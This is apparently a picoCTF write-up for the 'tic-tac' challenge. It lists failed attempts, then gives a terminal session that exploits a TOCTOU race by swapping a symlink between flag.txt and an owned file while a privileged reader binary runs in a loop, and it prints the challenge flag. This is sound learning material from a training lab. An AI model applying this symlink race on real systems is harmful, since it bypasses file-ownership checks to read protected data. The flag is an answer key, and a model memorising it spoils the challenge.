## 1. tic-tac 

### **Flag-**       
picoCTF{ToctoU_!s_3a5y_0490d70a}

### **Thought Process-**        
> Here when I got connected there were 3 files(Flag,source file and executable binary file). With the help source file(src.cpp) it became clear that the binary file > was just checking the permissions and ownership of files and then performing the tasks as per instructions. My tires-
>
> 1. I tired `chmod` to change file permissions but I couldn't.
> 2. I also tried running `sudo` to read the flag but it didn't work.
> 3. I tried changing the `src.cpp` file to see if somehow this and binary file are connected and may affect it's functionality but it didn't go as thought.
> 4. Then I tried to copy flag file contents to another file then print the other file.
> 5. Then I remembered that I forgot to compile the `src.cpp` file before running so I had to again perform the required modifications in `src.cpp` and then I > compiled it but even after running it, it did not work so I understood this will not affect the output.
> 6. So now I read the challenge description again and tried to re-interpret it. It gave me the ida that maybe I can create a program which uses `root` to read the content of `flag.txt` but I was again uunable to do so.
> 7. Thereafter I opened the `src.cpp` file and started observing and searching for vulnerabilities in it as it was the souce code of the binary file. Then I came across `TOCTOU` and came to know that this should work as this was there in challenge description(the word which I was not able to understand back then). For this I tired several ways.
> 8. First of all I created a continuos link chain `flag.txt -> link1 -> link2 -> link3 -> link4 -> link5 -> link6` and tried `./txtreader link6` but his didn't work.
> 9. then I tried link the file and run `txtreader` a number of times in a loop like parallel execution `for i in {1..500}; do ln -sf flag.txt link6 & ./txtreader link6 & done`.
> 10. I also tried it with controlled timing `for i in {1..500}; do ln -sf flag.txt link6 sleep 0.001 ./txtreader link6 done`.
> 11. Sequential way - `for i in {1..500}; do ln -sf flag.txt link6 ./txtreader link6 done`
> 12. The the I remembered that in this way the link pointing to the file is not being able to change in the correct timing so the last try I had was to run a continuos linking in the background and I made this better by creating a loop which continuous changes the link(pointer) to a file written by me which has all the permissions and the flag file so it was now running continuosly in the background so now I ran a loop for `./txtreader link` for 500 times hoping there will be a case in which there is correct timing and ot worked I got the flag.

### **The successful attempt-**    
``` bash
ctf-player@pico-chall$ echo "WHY" > hello.txt
ctf-player@pico-chall$ ./txtreader hello.txt
WHY
ctf-player@pico-chall$ while true
> do
>     ln -sf flag.txt link
>     ln -sf hello.txt link
> done
^C
^C
ctf-player@pico-chall$
ctf-player@pico-chall$ nano try.sh
ctf-player@pico-chall$ chmod +x try.sh
ctf-player@pico-chall$ ./try.sh &
[1] 8168
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ ./txtreader link
Error: you don't own this file
ctf-player@pico-chall$ ./txtreader link
WHY
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link done
> ^C
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link ;done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link; done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500} do ./txtreader link; done
-bash: syntax error near unexpected token `done'
ctf-player@pico-chall$ for i in {1..500}; do ./txtreader link; done
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_0490d70a}
WHY
Error: you don't own this file
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
WHY
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
Error: you don't own this file
WHY
WHY
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
WHY
WHY
Error: you don't own this file
WHY
Error: you don't own this file
ctf-player@pico-chall$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```
